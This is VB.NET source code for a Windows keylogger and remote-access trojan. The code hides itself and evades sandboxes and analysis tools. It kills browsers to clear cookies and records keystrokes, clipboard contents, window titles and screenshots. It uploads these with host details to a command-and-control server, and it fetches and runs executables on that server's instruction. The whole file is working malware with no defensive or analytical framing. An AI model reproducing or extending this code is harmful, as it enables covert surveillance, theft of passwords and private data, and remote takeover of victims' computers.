Imports System.Net
Imports System.IO
Imports System.Net.Mail
Imports Microsoft.Win32
Imports System.Web.Script.Serialization
Imports System.Globalization
Imports System.Linq
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Threading
Imports System.Windows.Forms
Imports System.Net.HttpWebRequest
Imports System.Management
Imports System.Text

Public Class Form1
    Const FileSplitter As String = "|FS|"
    Public stub, urlbot, Xargs() As String

    'Public urlbot As String = ""
    Public binfile As String = Environ("tmp") & "\bin.txt"
    Public Fileuri, Fileuri2, Fileuri3, Fileuri4, screenshotFileuri5 As String
    Public path_screenshot As String = Environ("tmp") & "\" & Now.ToString("yyyy-MM-dd-hh-mm") & "-screenshot.png"
    Public path_keylogs As String
    Public info_pc As String = Environ("tmp") & "\" & "info.txt"
    Public t_keylog, t_screen, t_doc, t_img, t_txt As Integer
    Public path1 As String = Application.ExecutablePath.ToString()
    Public path2 As String = Environ("tmp") & "\" & "c5e504606bceb80648bcecb9e1bfe1ee" & ".exe"

    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Public Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal key As Int32) As Int16

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' TextBox1.Text = urlbot
        '################################################################
        CheckForIllegalCrossThreadCalls = False
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            FileGet(1, stubb)
            FileClose(1)
            Dim ArgsX() As String = Split(stubb, FileSplitter)
            urlbot = ArgsX(1)
        Catch ex As Exception
            REM Do nothing
        End Try
        '################################################################

        Try
            '##########################################################################
            Me.Hide()
            Me.Opacity = 0
            Me.ShowInTaskbar = False

            'check Mutex
            Dim mut As System.Threading.Mutex = _
            New System.Threading.Mutex(False, Application.ProductName)
            Dim running As Boolean = Not mut.WaitOne(0, False)
            If running Then
                Application.ExitThread()
                Return
            End If

            '##########################################################################

            If CheckIfSandboxed() Then
                Application.Exit()
            End If
            Timer_checkSandBox.Start()

            '##########################################################################
            Install_server()
            '##########################################################################

            kill_prog("chrome")
            kill_prog("opera")
            kill_prog("firefox")
            kill_prog("brave")
            kill_prog("browser")
            kill_prog("orbitum")
            kill_prog("dragon")
            cls_cookies()

            config_txt.Text = Send_request_to_c2(urlbot & "/config.json")

            Dim json As String = "[" & config_txt.Text & "]"


            Dim dict As Object = New JavaScriptSerializer().Deserialize(Of List(Of Object))(json)

            For Each item As Object In dict

                t_keylog = item("time_keylogs").ToString
                t_screen = item("time_screenshot").ToString
                t_doc = item("grab_docs").ToString
                t_img = item("grab_photos").ToString
                t_txt = item("grab_txt").ToString


            Next

            Timer3.Interval = t_keylog * 60000

            Timer4.Interval = t_screen * 60000



            'get info pc
            '################################################################################################################

            Dim str_info As String = "{ " & Chr(34) & "PC Name" & Chr(34) & ":" & Chr(34) & System.Net.Dns.GetHostName() & Chr(34) & "," & Chr(34) & "Operating System" & Chr(34) & ":" & Chr(34) & info.GetOS & Chr(34) & "," & Chr(34) & "Anti virus" & Chr(34) & ":" & Chr(34) & info.GetAntivirus & Chr(34) & "," & Chr(34) & "Firewall" & Chr(34) & ":" & Chr(34) & info.GetFirewall & Chr(34) & "," & Chr(34) & "Processor" & Chr(34) & ":" & Chr(34) & info.GetProcessor & Chr(34) & "," & Chr(34) & "Memory (RAM)" & Chr(34) & ":" & Chr(34) & info.GetMemory() & Chr(34) & " }"
            System.IO.File.WriteAllText(info_pc, "")
            Dim Writer2 As System.IO.StreamWriter
            Writer2 = New System.IO.StreamWriter(info_pc, OpenMode.Input)
            Writer2.Write(str_info)
            Writer2.Close()
            '################################################################################################################

            upload_info()

            '################################################################################################################

            contact_c2()

            '################################################################################################################

            Timer1.Start()
            Timer2.Start()
            Timer3.Start()
            Timer4.Start()
            Timer5.Start()
            Timer6.Start()

            System.IO.File.WriteAllText(binfile, "")
            Dim Writer3 As System.IO.StreamWriter
            Writer3 = New System.IO.StreamWriter(binfile, OpenMode.Input)
            Writer3.Write(urlbot)
            Writer3.Close()


            Dim Ressourcl2() As Byte = My.Resources.bin
            FileOpen(1, Environ("tmp") & "\bin.exe", OpenMode.Binary)
            FilePut(1, Ressourcl2)
            FileClose(1)
            Dim file2 As String = Environ("tmp") & "\bin.exe"
            Process.Start(file2)

            'cls_cookies()

        Catch ex As Exception

        End Try

    End Sub


    Public Sub KeyLogs()
        If (GetAsyncKeyState(Keys.A)) Then
            keylog_txt.Text = keylog_txt.Text + "a"
        ElseIf (GetAsyncKeyState(Keys.B)) Then
            keylog_txt.Text = keylog_txt.Text + "b"
        ElseIf (GetAsyncKeyState(Keys.C)) Then
            keylog_txt.Text = keylog_txt.Text + "c"
        ElseIf (GetAsyncKeyState(Keys.D)) Then
            keylog_txt.Text = keylog_txt.Text + "d"
        ElseIf (GetAsyncKeyState(Keys.E)) Then
            keylog_txt.Text = keylog_txt.Text + "e"
        ElseIf (GetAsyncKeyState(Keys.F)) Then
            keylog_txt.Text = keylog_txt.Text + "f"
        ElseIf (GetAsyncKeyState(Keys.G)) Then
            keylog_txt.Text = keylog_txt.Text + "g"
        ElseIf (GetAsyncKeyState(Keys.H)) Then
            keylog_txt.Text = keylog_txt.Text + "h"
        ElseIf (GetAsyncKeyState(Keys.I)) Then
            keylog_txt.Text = keylog_txt.Text + "i"
        ElseIf (GetAsyncKeyState(Keys.J)) Then
            keylog_txt.Text = keylog_txt.Text + "j"
        ElseIf (GetAsyncKeyState(Keys.K)) Then
            keylog_txt.Text = keylog_txt.Text + "k"
        ElseIf (GetAsyncKeyState(Keys.L)) Then
            keylog_txt.Text = keylog_txt.Text + "l"
        ElseIf (GetAsyncKeyState(Keys.M)) Then
            keylog_txt.Text = keylog_txt.Text + "m"
        ElseIf (GetAsyncKeyState(Keys.N)) Then
            keylog_txt.Text = keylog_txt.Text + "n"
        ElseIf (GetAsyncKeyState(Keys.O)) Then
            keylog_txt.Text = keylog_txt.Text + "o"
        ElseIf (GetAsyncKeyState(Keys.P)) Then
            keylog_txt.Text = keylog_txt.Text + "p"
        ElseIf (GetAsyncKeyState(Keys.Q)) Then
            keylog_txt.Text = keylog_txt.Text + "q"
        ElseIf (GetAsyncKeyState(Keys.R)) Then
            keylog_txt.Text = keylog_txt.Text + "r"
        ElseIf (GetAsyncKeyState(Keys.S)) Then
            keylog_txt.Text = keylog_txt.Text + "s"
        ElseIf (GetAsyncKeyState(Keys.T)) Then
            keylog_txt.Text = keylog_txt.Text + "t"
        ElseIf (GetAsyncKeyState(Keys.U)) Then
            keylog_txt.Text = keylog_txt.Text + "u"
        ElseIf (GetAsyncKeyState(Keys.V)) Then
            keylog_txt.Text = keylog_txt.Text + "v"
        ElseIf (GetAsyncKeyState(Keys.W)) Then
            keylog_txt.Text = keylog_txt.Text + "w"
        ElseIf (GetAsyncKeyState(Keys.X)) Then
            keylog_txt.Text = keylog_txt.Text + "x"
        ElseIf (GetAsyncKeyState(Keys.Y)) Then
            keylog_txt.Text = keylog_txt.Text + "y"
        ElseIf (GetAsyncKeyState(Keys.Z)) Then
            keylog_txt.Text = keylog_txt.Text + "z"
        ElseIf (GetAsyncKeyState(Keys.D0)) Then
            keylog_txt.Text = keylog_txt.Text + "0"
        ElseIf (GetAsyncKeyState(Keys.D1)) Then
            keylog_txt.Text = keylog_txt.Text + "1"
        ElseIf (GetAsyncKeyState(Keys.D2)) Then
            keylog_txt.Text = keylog_txt.Text + "2"
        ElseIf (GetAsyncKeyState(Keys.D3)) Then
            keylog_txt.Text = keylog_txt.Text + "3"
        ElseIf (GetAsyncKeyState(Keys.D4)) Then
            keylog_txt.Text = keylog_txt.Text + "4"
        ElseIf (GetAsyncKeyState(Keys.D5)) Then
            keylog_txt.Text = keylog_txt.Text + "5"
        ElseIf (GetAsyncKeyState(Keys.D6)) Then
            keylog_txt.Text = keylog_txt.Text + "6"
        ElseIf (GetAsyncKeyState(Keys.D7)) Then
            keylog_txt.Text = keylog_txt.Text + "7"
        ElseIf (GetAsyncKeyState(Keys.D8)) Then
            keylog_txt.Text = keylog_txt.Text + "8"
        ElseIf (GetAsyncKeyState(Keys.D9)) Then
            keylog_txt.Text = keylog_txt.Text + "9"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D0)) Then
            keylog_txt.Text = keylog_txt.Text + ")"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D1)) Then
            keylog_txt.Text = keylog_txt.Text + "!"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D2)) Then
            keylog_txt.Text = keylog_txt.Text + "@"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D3)) Then
            keylog_txt.Text = keylog_txt.Text + "#"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D4)) Then
            keylog_txt.Text = keylog_txt.Text + "$"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D5)) Then
            keylog_txt.Text = keylog_txt.Text + "%"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D6)) Then
            keylog_txt.Text = keylog_txt.Text + "^"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D7)) Then
            keylog_txt.Text = keylog_txt.Text + "&"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D8)) Then
            keylog_txt.Text = keylog_txt.Text + "*"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey + Keys.D9)) Then
            keylog_txt.Text = keylog_txt.Text + "("
        ElseIf (GetAsyncKeyState(Keys.NumPad0)) Then
            keylog_txt.Text = keylog_txt.Text + "0"
        ElseIf (GetAsyncKeyState(Keys.NumPad1)) Then
            keylog_txt.Text = keylog_txt.Text + "1"
        ElseIf (GetAsyncKeyState(Keys.NumPad2)) Then
            keylog_txt.Text = keylog_txt.Text + "2"
        ElseIf (GetAsyncKeyState(Keys.NumPad3)) Then
            keylog_txt.Text = keylog_txt.Text + "3"
        ElseIf (GetAsyncKeyState(Keys.NumPad4)) Then
            keylog_txt.Text = keylog_txt.Text + "4"
        ElseIf (GetAsyncKeyState(Keys.NumPad5)) Then
            keylog_txt.Text = keylog_txt.Text + "5"
        ElseIf (GetAsyncKeyState(Keys.NumPad6)) Then
            keylog_txt.Text = keylog_txt.Text + "6"
        ElseIf (GetAsyncKeyState(Keys.NumPad7)) Then
            keylog_txt.Text = keylog_txt.Text + "7"
        ElseIf (GetAsyncKeyState(Keys.NumPad8)) Then
            keylog_txt.Text = keylog_txt.Text + "8"
        ElseIf (GetAsyncKeyState(Keys.NumPad9)) Then
            keylog_txt.Text = keylog_txt.Text + "9"
        ElseIf (GetAsyncKeyState(Keys.Add)) Then
            keylog_txt.Text = keylog_txt.Text + "+"
        ElseIf (GetAsyncKeyState(Keys.Alt)) Then
            keylog_txt.Text = keylog_txt.Text + "[Alt]"
        ElseIf (GetAsyncKeyState(Keys.Apps)) Then
            keylog_txt.Text = keylog_txt.Text + "[Apps]"
        ElseIf (GetAsyncKeyState(Keys.Attn)) Then
            keylog_txt.Text = keylog_txt.Text + "[Attn]"
        ElseIf (GetAsyncKeyState(Keys.IMEAccept)) Then
            keylog_txt.Text = keylog_txt.Text + "[IME]"
        ElseIf (GetAsyncKeyState(Keys.Back)) Then
            keylog_txt.Text = keylog_txt.Text + "[Back]"
        ElseIf (GetAsyncKeyState(Keys.BrowserBack)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserBack]"
        ElseIf (GetAsyncKeyState(Keys.BrowserFavorites)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserFavorites]"
        ElseIf (GetAsyncKeyState(Keys.BrowserForward)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserForward]"
        ElseIf (GetAsyncKeyState(Keys.BrowserHome)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserHome]"
        ElseIf (GetAsyncKeyState(Keys.BrowserRefresh)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserRefresh]"
        ElseIf (GetAsyncKeyState(Keys.BrowserSearch)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserSearch]"
        ElseIf (GetAsyncKeyState(Keys.BrowserStop)) Then
            keylog_txt.Text = keylog_txt.Text + "[BrowserStop]"
        ElseIf (GetAsyncKeyState(Keys.Cancel)) Then
            keylog_txt.Text = keylog_txt.Text + "[Cancel]"
        ElseIf (GetAsyncKeyState(Keys.CapsLock)) Then
            keylog_txt.Text = keylog_txt.Text + "[CapsLock]"
        ElseIf (GetAsyncKeyState(Keys.Clear)) Then
            keylog_txt.Text = keylog_txt.Text + "[Clear]"
        ElseIf (GetAsyncKeyState(Keys.Control)) Then
            keylog_txt.Text = keylog_txt.Text + "[Control]"
        ElseIf (GetAsyncKeyState(Keys.ControlKey)) Then
            keylog_txt.Text = keylog_txt.Text + "[Ctrl]"
        ElseIf (GetAsyncKeyState(Keys.Crsel)) Then
            keylog_txt.Text = keylog_txt.Text + "[Crsel]"
        ElseIf (GetAsyncKeyState(Keys.Decimal)) Then
            keylog_txt.Text = keylog_txt.Text + "[Decimal]"
        ElseIf (GetAsyncKeyState(Keys.Delete)) Then
            keylog_txt.Text = keylog_txt.Text + "[Delete]"
        ElseIf (GetAsyncKeyState(Keys.Divide)) Then
            keylog_txt.Text = keylog_txt.Text + "[Divide]"
        ElseIf (GetAsyncKeyState(Keys.Down)) Then
            keylog_txt.Text = keylog_txt.Text + "[↓]"
        ElseIf (GetAsyncKeyState(Keys.End)) Then
            keylog_txt.Text = keylog_txt.Text + "[end]"
        ElseIf (GetAsyncKeyState(Keys.Enter)) Then
            keylog_txt.Text = keylog_txt.Text + "[Enter]"
        ElseIf (GetAsyncKeyState(Keys.EraseEof)) Then
            keylog_txt.Text = keylog_txt.Text + "[EraseEof]"
        ElseIf (GetAsyncKeyState(Keys.Escape)) Then
            keylog_txt.Text = keylog_txt.Text + "[ESC]"
        ElseIf (GetAsyncKeyState(Keys.Execute)) Then
            keylog_txt.Text = keylog_txt.Text + "[Execute]"
        ElseIf (GetAsyncKeyState(Keys.Exsel)) Then
            keylog_txt.Text = keylog_txt.Text + "[Exsel]"
        ElseIf (GetAsyncKeyState(Keys.F1)) Then
            keylog_txt.Text = keylog_txt.Text + "[F1]"
        ElseIf (GetAsyncKeyState(Keys.F2)) Then
            keylog_txt.Text = keylog_txt.Text + "[F2]"
        ElseIf (GetAsyncKeyState(Keys.F3)) Then
            keylog_txt.Text = keylog_txt.Text + "[F3]"
        ElseIf (GetAsyncKeyState(Keys.F4)) Then
            keylog_txt.Text = keylog_txt.Text + "[F4]"
        ElseIf (GetAsyncKeyState(Keys.F5)) Then
            keylog_txt.Text = keylog_txt.Text + "[F5]"
        ElseIf (GetAsyncKeyState(Keys.F6)) Then
            keylog_txt.Text = keylog_txt.Text + "[F6]"
        ElseIf (GetAsyncKeyState(Keys.F7)) Then
            keylog_txt.Text = keylog_txt.Text + "[F7]"
        ElseIf (GetAsyncKeyState(Keys.F8)) Then
            keylog_txt.Text = keylog_txt.Text + "[F8]"
        ElseIf (GetAsyncKeyState(Keys.F9)) Then
            keylog_txt.Text = keylog_txt.Text + "[F9]"
        ElseIf (GetAsyncKeyState(Keys.F10)) Then
            keylog_txt.Text = keylog_txt.Text + "[F10]"
        ElseIf (GetAsyncKeyState(Keys.F11)) Then
            keylog_txt.Text = keylog_txt.Text + "[F11]"
        ElseIf (GetAsyncKeyState(Keys.F12)) Then
            keylog_txt.Text = keylog_txt.Text + "[F12]"
        ElseIf (GetAsyncKeyState(Keys.Home)) Then
            keylog_txt.Text = keylog_txt.Text + "[HOME]"
        ElseIf (GetAsyncKeyState(Keys.LaunchMail)) Then
            keylog_txt.Text = keylog_txt.Text + "[LaunchMail]"
        ElseIf (GetAsyncKeyState(Keys.LControlKey)) Then
            keylog_txt.Text = keylog_txt.Text + "[LControlKey]"
        ElseIf (GetAsyncKeyState(Keys.Left)) Then
            keylog_txt.Text = keylog_txt.Text + "[←]"
        ElseIf (GetAsyncKeyState(Keys.LineFeed)) Then
            keylog_txt.Text = keylog_txt.Text + "[LineFeed]"
        ElseIf (GetAsyncKeyState(Keys.LMenu)) Then
            keylog_txt.Text = keylog_txt.Text + "[LMenu]"
        ElseIf (GetAsyncKeyState(Keys.LWin)) Then
            keylog_txt.Text = keylog_txt.Text + "[Lwin]"
        ElseIf (GetAsyncKeyState(Keys.MButton)) Then
            keylog_txt.Text = keylog_txt.Text + "[MButton]"
        ElseIf (GetAsyncKeyState(Keys.Menu)) Then
            keylog_txt.Text = keylog_txt.Text + "[Menu]"
        ElseIf (GetAsyncKeyState(Keys.Multiply)) Then
            keylog_txt.Text = keylog_txt.Text + "[Multiply]"
        ElseIf (GetAsyncKeyState(Keys.Next)) Then
            keylog_txt.Text = keylog_txt.Text + "[Next]"
        ElseIf (GetAsyncKeyState(Keys.Oem1)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem1]"
        ElseIf (GetAsyncKeyState(Keys.Oem2)) Then
            keylog_txt.Text = keylog_txt.Text + "[/]"
        ElseIf (GetAsyncKeyState(Keys.Oem102)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem102]"
        ElseIf (GetAsyncKeyState(Keys.Oem3)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem3]"
        ElseIf (GetAsyncKeyState(Keys.Oem4)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem4]"
        ElseIf (GetAsyncKeyState(Keys.Oem5)) Then
            keylog_txt.Text = keylog_txt.Text + "[\]"
        ElseIf (GetAsyncKeyState(Keys.Oem6)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem6]"
        ElseIf (GetAsyncKeyState(Keys.Oem7)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem7]"
        ElseIf (GetAsyncKeyState(Keys.Oem8)) Then
            keylog_txt.Text = keylog_txt.Text + "[Oem8]"
        ElseIf (GetAsyncKeyState(Keys.OemOpenBrackets)) Then
            keylog_txt.Text = keylog_txt.Text + "{"
        ElseIf (GetAsyncKeyState(Keys.Oemcomma)) Then
            keylog_txt.Text = keylog_txt.Text + ","
        ElseIf (GetAsyncKeyState(Keys.OemMinus)) Then
            keylog_txt.Text = keylog_txt.Text + "-"
        ElseIf (GetAsyncKeyState(Keys.OemPeriod)) Then
            keylog_txt.Text = keylog_txt.Text + "。"
        ElseIf (GetAsyncKeyState(Keys.OemPipe)) Then
            keylog_txt.Text = keylog_txt.Text + ">"
        ElseIf (GetAsyncKeyState(Keys.OemQuestion)) Then
            keylog_txt.Text = keylog_txt.Text + "?"
        ElseIf (GetAsyncKeyState(Keys.Oemtilde)) Then
            keylog_txt.Text = keylog_txt.Text + "~"
        ElseIf (GetAsyncKeyState(Keys.PageDown)) Then
            keylog_txt.Text = keylog_txt.Text + "[PageDown]"
        ElseIf (GetAsyncKeyState(Keys.PageUp)) Then
            keylog_txt.Text = keylog_txt.Text + "[PageUp]"
        ElseIf (GetAsyncKeyState(Keys.RControlKey)) Then
            keylog_txt.Text = keylog_txt.Text + "[RControlKey]"
        ElseIf (GetAsyncKeyState(Keys.Right)) Then
            keylog_txt.Text = keylog_txt.Text + "[→]"
        ElseIf (GetAsyncKeyState(Keys.RMenu)) Then
            keylog_txt.Text = keylog_txt.Text + "[RMenu]"
        ElseIf (GetAsyncKeyState(Keys.RWin)) Then
            keylog_txt.Text = keylog_txt.Text + "[RWin]"
        ElseIf (GetAsyncKeyState(Keys.ShiftKey)) Then
            keylog_txt.Text = keylog_txt.Text + "[ShiftKey]"
        ElseIf (GetAsyncKeyState(Keys.Space)) Then
            keylog_txt.Text = keylog_txt.Text + "[Space]"
        ElseIf (GetAsyncKeyState(Keys.Tab)) Then
            keylog_txt.Text = keylog_txt.Text + "[Tab]"
        ElseIf (GetAsyncKeyState(Keys.Up)) Then
            keylog_txt.Text = keylog_txt.Text + "[↑]"
        End If


    End Sub



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        KeyLogs()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        get_clipper_and_clear()

    End Sub


    Private Sub get_clipper_and_clear()
        If Clipboard.ContainsText = True Then
            Try
                keylog_txt.AppendText(vbNewLine & "Clipper : [ " & My.Computer.Clipboard.GetData(DataFormats.Text).ToString & " ]" & vbNewLine)
                My.Computer.Clipboard.Clear()
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            If keylog_txt.Text = vbNullString Then
                Exit Sub
            Else
                path_keylogs = Environ("tmp") & "\" & Now.ToString("yyyy-MM-dd-hh-mm") & "-keylogs.txt"
                System.IO.File.WriteAllText(path_keylogs, "")
                Dim Writer3 As System.IO.StreamWriter
                Writer3 = New System.IO.StreamWriter(path_keylogs, OpenMode.Input)
                Writer3.Write(keylog_txt.Text)
                Writer3.Close()
                keylog_txt.Clear()
                '##############################################################################
                upload_logs()
                '##############################################################################
                My.Computer.FileSystem.DeleteFile(path_keylogs)

                '


            End If

        Catch ex As Exception

        End Try


    End Sub

    Public Sub upload_logs()
        Try
            Dim cmd1 As String
            cmd1 = "/logs.php?hwid=" & info.HWID()
            Using we As New WebClient()
                Dim responseArray As Byte()
                responseArray = we.UploadFile(urlbot & cmd1, path_keylogs)
                Fileuri = System.Text.Encoding.ASCII.GetString(responseArray)
            End Using

        Catch ex As Exception

        End Try
    End Sub

    Public Sub upload_screenshot_c2()
        Try
            Dim cmd1 As String
            cmd1 = "/screen.php?hwid=" & info.HWID()
            Using we As New WebClient()
                Dim responseArray As Byte()
                responseArray = we.UploadFile(urlbot & cmd1, path_screenshot2)
                Fileuri4 = System.Text.Encoding.ASCII.GetString(responseArray)
            End Using

        Catch ex As Exception

        End Try
    End Sub




    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Try
            screenshot_2()
            upload_screenshot_c2()
            My.Computer.FileSystem.DeleteFile(path_screenshot2)
        Catch ex As Exception

        End Try

    End Sub


    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            ' stop timer before showing msgbox so it is not detected!
            Timer5.Stop()
            'MsgBox(CapTxt)
            keylog_txt.AppendText(vbNewLine & "[ " & CapTxt & " - " & Now.ToString & " ]" & vbNewLine)
            ' resume timer 
            Timer5.Start()
        End If
    End Sub


    Public Function CheckIfSandboxed() As Boolean
        Dim virtualPc = IsRunning("vpcmap", "vmsrvc", "vmusrvc")
        Dim virtualBox = IsRunning("VBoxService")
        Dim wireshark = IsRunning("wireshark.exe")
        Dim sandboxie = IsModuleLoaded("sbiedll.dll")
        Dim threatExpert = IsModuleLoaded("dbghelp.dll")
        Dim anubis = IsSandbox("76487-337-8429955-22614")
        Dim joeBox = IsSandbox("55274-640-2673064-23950")
        Dim cwSandbox = IsSandbox("76487-644-3177037-23510")
        Dim tools = IsRunning("NETSTAT", "FILEMON", "PROCMON", "REGMON", "CAIN", "NETMON", "TCPVIEW", "ProcessHacker", "HTTPNetworkSniffer")
        If virtualBox OrElse virtualPc OrElse wireshark OrElse sandboxie OrElse anubis OrElse joeBox OrElse cwSandbox OrElse tools Then
            Return True
        Else
            Return False
        End If
    End Function

    Public Function Send_request_to_c2(api_link) As String

        Dim uri_val As New Uri(api_link)
        Dim request As Net.HttpWebRequest = Net.HttpWebRequest.Create(uri_val)

        request.Method = WebRequestMethods.Http.Get

        Dim response As HttpWebResponse = request.GetResponse()
        Dim reader As New StreamReader(response.GetResponseStream())
        Dim rezlt As String = reader.ReadToEnd()

        response.Close()

        Return rezlt

    End Function


    Public Sub upload_info()
        Try
            Dim cmd1 As String
            cmd1 = "/info.php?hwid=" & info.HWID()
            Using we As New WebClient()
                Dim responseArray As Byte()
                responseArray = we.UploadFile(urlbot & cmd1, info_pc)
                Fileuri2 = System.Text.Encoding.ASCII.GetString(responseArray)
            End Using

        Catch ex As Exception

        End Try
    End Sub


    Public Sub contact_c2()
        Try
            Dim cmd As String
            cmd = "/gate.php?hwid=" & info.HWID()
            Send_GET(urlbot & cmd)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick

        txt_tasks.Text = Send_request_to_c2(urlbot & "/task.php?hwid=" & info.HWID())
        If txt_tasks.Text = vbNullString Then

            'do nothing 
        Else
            Timer6.Stop()
            DownloadAndRun(txt_tasks.Text)
            txt_tasks.Clear()
            Send_GET(urlbot & "/task.php?hwid=" & info.HWID() & "&completed=1")
            Timer6.Start()
        End If
    End Sub

    Private Sub DownloadAndRun(ByVal exeUrl As String)
        Using wc As New WebClient()
            Dim data As Byte() = wc.DownloadData(exeUrl)
            Dim tempFilePath As String = Path.GetTempFileName() & ".exe"
            File.WriteAllBytes(tempFilePath, data)
            Process.Start(tempFilePath)
        End Using
    End Sub
End Class
